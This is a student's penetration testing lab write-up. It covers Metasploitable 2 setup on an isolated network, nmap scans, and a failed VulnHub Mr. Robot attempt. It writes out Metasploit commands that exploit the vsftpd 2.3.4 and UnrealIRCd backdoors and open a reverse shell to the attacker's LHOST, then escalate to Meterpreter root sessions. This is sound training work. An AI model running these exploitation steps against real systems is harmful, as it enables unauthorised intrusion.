Week 2 of Penetration Testing course.

Course material: https://terokarvinen.com/2022/tunkeutumistestaus-ict4tn027-3010-syksylla-2022/

Environment: VirtualBox VM running Kali Linux. VM has 2 GB of RAM and 80 GB of disk space.

## Read and summarize

**Objective: Read the Jaswal 2020: Mastering Metasploit - 4th edition: Chapter 1: Approaching Penetration Test Using Metasploit (start from "Conducting a penetration test with Metasploit")**

- Basic terms used in Metasploit:

  - Exploits (code that is exploit target vulnerability)
  - Payload (code that runs in the target after successful exploitation)
  - Auxiliary (Metasploit modules that give additional functionality)
  - Encoders (Obfuscate modules to avoid detection)
  - Meterpreter (Payload that uses DLL injection. Provides additional functionality that can be run on the target system.)

- Benefits of Metasploit:
  - Open source
  - Support for testing large networks and natural naming conventions
  - Smart payload generation and switching mechanism (Meterpreter)
  - Cleaner exits. Metasploit often doesn't crash the target system on exit where others might.

## Metasploitable

**Objective: Install Metasploitable 2 to the same Host-only network with your attacking computer.**

(I did this step earlier so I'm writing from what I remember)

### Install and configure

I downloaded [Metasploitable 2](https://sourceforge.net/projects/metasploitable/), unzipped the file, and added the VM to my VirtualBox by clicking Add > Machine. For options, I set _Type_ to unknown and _Version_ to unknown 64-bit.

To configure the Host-only network connection I clicked on File > Host Network Manager, inside VirtualBox. I created a new Host-only network by clicking the Create button in the top left corner and enabled DHCP Server by clicking the box in the row where my new network was listed.

![metasploitable host network manager settings](metasploitable-host-network-manager-settings.png)

To set the Host-only network to Metasploitable 2, I clicked on the settings button of my Metasploitable 2 VM. In the Network tab, I changed _Adapter 1_ to be attached to Host-only Adapter and the name to be the new Host-only network I had configured.

![metasploitable host-only network settings](metasploitable-host-only-network-settings.png)

I did the same to my Kali Linux VM except I added the Host-only network to _Adapter 2_, leaving _Adapter 1_ to the default NAT. This was done so that I could enable Internet connection in Kali if I so wished.

### Testing the connection

I started up Kali Linux and pinged www.google.com. I got back a response which I expected.

![pinging google, got response](kali-linux-ping-google.png)

I opened Kali network settings and disconnected the Adapter 1 NAT cable. This was so that there would be no access to the outside Internet during the penetration testing.

![kali linux network settings](kali-linux-host-only-network-settings.png)

I pinged www.google.com again and this time I got no response, as expected.

![pinging google, no response](kali-linux-ping-google-fail.png)

I started the Metasploitable 2 VM, logged in the default credentials, and pinged www.google.com. I got no response which confirmed that the machine was not connected to the Internet.

![metasploitable 2 ping google fail](metasploitable-ping-google-fail.png)

I looked up my local IP address for the Metasploitable 2 machine by typing the _ifconfig_ command

    $ ifconfig

![ifconfig local ip](ifconfig-local-ip.png)

I pinged the Metasploitable 2 local IP in Kali to confirm that the both the machines were operating on the same network. The ping received a response which confirmed it.

## Port scanning Metasploitable

**Objective: Port scan Metasploitable 2. Utilize additional techniques (banner grabbing, NSE...). Analyze results of the port scan. Store port scan results to Metasploitable DB and files.**

I started off by running `sudo msfdb run` to initialize my Metasploit database. Inside the msf console, I checked the status of my database connection with `db_status` and observed that I was connected to msf, and the connection type was PostgreSQL.

    $ sudo msfdb run
    msf6 > db_status

![db status connected to PostgreSQL](msfconsole-db-status.png)

For this project, I created a workspace called _metasploitable-2_.

    msf6 > workspace -a metasploitable-2

![Metasploit workspace](metasploit-workspace.png)

I used Nmap to port scan the target. I chose to use the `-sV` option to specify a version scan so that I could quickly get an overlook of the open ports and services running in them (source: man nmap). With `db_nmap` the results get stored in the PostgreSQL database so I used `services` to get a bit more of a readable output.

    msf6 > db_nmap -sV 192.168.11.4
    msf6 > services

![list of metasploitable 2 ports and services](metasploitable-2-services.png)

I saw that there were numerous ports open with different services running in them. All the ports used TCP protocol. From searching by the service name in [exploit-db.com](https://www.exploit-db.com/) I found out that there were backdoor command execution exploits available for at least vsftpd 2.3.4 and UnrealIRCd.

I scanned again but this time using the `-sC` option which specifies a script scan that runs Metasploitâ€™s default list of common scripts. There was some additional information on port 21/tcp and others but nothing really stood out to me.

    msf6 > db_nmap -sC 192.168.11.4

![ftp port 21/tcp scan](metasploitable-2-ftp-port.png)

## Gaining access to Metasploitable

### VSFTPD 2.3.4

I decided to try to exploit the vsftpd 2.3.4 vulnerability since we went over it during the previous lesson and I wanted to replicate the results.

I searched for the exploit in Metasploit and selected it with the `use` command.

    msf6 > search vsftpd 2.3.4
    msf6 > use 0

![use vsftpd 2.3.4 backdoor](use-vsftpd-234-backdoor.png)

I looked at the exploit options and noticed that it requires RHOSTS to be set. I set it with the `setg` command which sets a global variable.

    msf6 > show options
    msf6 > setg RHOSTS 192.168.11.4

![exploit options](exploit-options.png)

I ran the exploit and gained access to a command shell.

![run exploit](run-exploit.png)

Next, I wanted to gain elevated access by using Meterpreter. I put the current command shell session to the background with the `background` command. I then listed my sessions with `sessions` and opened a new Meterpreter session with `sessions -u 1`. I entered session 2 with Meterpreter.

    background
    msf6 > sessions
    msf6 > sessions -u 1
    msf6 > sessions 2

![meterpreter session](meterpreter-login.png)

### UnrealIRCd

Port 6667/tcp was running UnrealIRCd which had a backdoor command execution exploit available. I backed out of the previous session with `background` and from the current module with `back`. I then searched Metasploit for the UnrealIRCd exploit.

![search unrealircd](search-unrealircd.png)

I selected the exploit with the `use` command and looked up the options with `show options`. The only thing it required, not set by default, was the RHOSTS variable which I had defined earlier with the `setg` command.

![exploit options](unrealircd-exploit-options.png)

I ran the exploit but got back an error message saying I need to set a payload for the exploit. I read more about payloads in Metasploit. A common use case for payloads is to open a shell. Using [this Rapid7 guide](https://docs.rapid7.com/metasploit/working-with-payloads/) I found a command that shows all the compatible payloads for an exploit.

    msf6 > show payloads

![show payloads](show-payloads.png)

I had quite a few to choose from but I landed on /cmd/unix/reverse because the Rapid7 guide had it listed as one of the defaults Metasploit uses. I ran the exploit again with `run`. This time it got caught up by a missing LHOST option in the payload. I set the LHOST to the target IP.

![LHOST option](lhost-option.png)

I ran the exploit. The exploit went through but no session was created.

I quickly realized my mistake which was setting the LHOST listening address to the target IP instead of my own. I changed the option to `set LHOST 192.168.11.3` and ran exploit again. This time it worked and a shell session was opened.

![shell session](shell-session.png)

I upgraded the session to use Meterpreter and gained root access.

    msf6 > sessions -u 3
    msf6 > sessions 4

## VulnHub: Mr. Robot

**Objective: Penetrate a machine from [VulnHub](https://www.vulnhub.com/). Pick an easy one.**

I picked [Mr. Robot](https://www.vulnhub.com/entry/mr-robot-1,151/) as the challenge I would tackle. I had seen this one mentioned somewhere as a good beginner machine for pen-testing. It has three keys hidden in different locations. The difficulty level is considered beginner-to-intermediate but since the keys get progressively more, I thought I would at least attempt to get some of them.

I booted up the Mr. Robot VM and switched to Kali Linux. I cleared the previous data from Metasploit database.

    $ sudo msfdb reinit
    $ sudo msfconsole

First, I needed to find out the local IP address of the target machine. I did a ping sweep with nmap to find all the local IPs.

    msf6 > db_nmap -sn 192.168.11.0-255

![new hosts](new-hosts.png)

192.158.11.5 seems to be the one since it's the next number to be reserved. I port scanned the IP, this time telling nmap to scan all the ports instead of the 1000 most popular ones that it defaults to.

    msf6 > db_nmap -p1-65535 -sV 192.168.11.5

![version scan results](mrrobot-nmap-version-scan.png)

The scan took a while to complete but in the end it listed ports 22/tcp, 80/tcp, and 443/tcp. The closed port, 22/tcp is the default SSH port. The two open ports 80/tcp and 443/tcp are HTTP and HTTPS respectively. This scan didn't really yield any usable data so I tried a script scan on the three ports.

![script scan results](mrrobot-script-scan.png)

The script scan didn't reveal anything new either. Next, I enabled Operating System detection using the `-O` option.

    msf6 > db_nmap -O 192.168.11.5

![os scan](mrrobot-os-scan.png)

The port scan with OS detection enabled showed that the machine was a Linux version 3.X or 4.X. I knew this already but I was hoping that it would give some additional information to work with.

I ran another scan with `-A` option enabled. `-A` just runs `-O`, `-sV`, `-sC`, and `--traceroute` with one go. I wanted to make sure nothing I didn't miss anything. The scan didn't reveal anything new.

**UPDATE:** I gave up on this and watched a [walkthrough](https://www.youtube.com/watch?v=vxFYfJbQAoc). Maybe I could've gotten the first flag. The walkthrough does go off in a different direction than what I was thinking. The harder flags were out of the scope for this weekâ€™s assignments.
